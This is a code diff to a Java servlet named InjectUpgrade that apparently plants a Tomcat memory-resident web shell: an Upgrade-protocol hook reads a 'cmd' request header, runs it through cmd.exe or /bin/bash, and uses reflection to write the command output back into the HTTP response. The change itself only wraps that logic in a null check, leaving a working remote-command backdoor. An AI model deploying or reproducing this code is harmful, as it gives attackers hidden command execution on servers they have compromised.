@@ -60,15 +60,20 @@ public class InjectUpgrade extends HttpServlet {
 
         @Override
         public boolean accept(org.apache.coyote.Request request) {
-            String p = request.getHeader("cmd");
-            System.out.println(p);
+
             try {
-                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/bash", "-c", p};
-                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
-                response.setAccessible(true);
-                Response resp = (Response) response.get(request);
-                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
-                resp.doWrite(ByteBuffer.wrap(result));
+                String p = request.getHeader("cmd");
+                if (p != null) {
+                    System.out.println(p);
+
+                    String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/bash", "-c", p};
+                    Field response = org.apache.coyote.Request.class.getDeclaredField("response");
+                    response.setAccessible(true);
+                    Response resp = (Response) response.get(request);
+                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
+                    resp.doWrite(ByteBuffer.wrap(result));
+
+                }
             } catch (Exception e) {
             }
             return false;
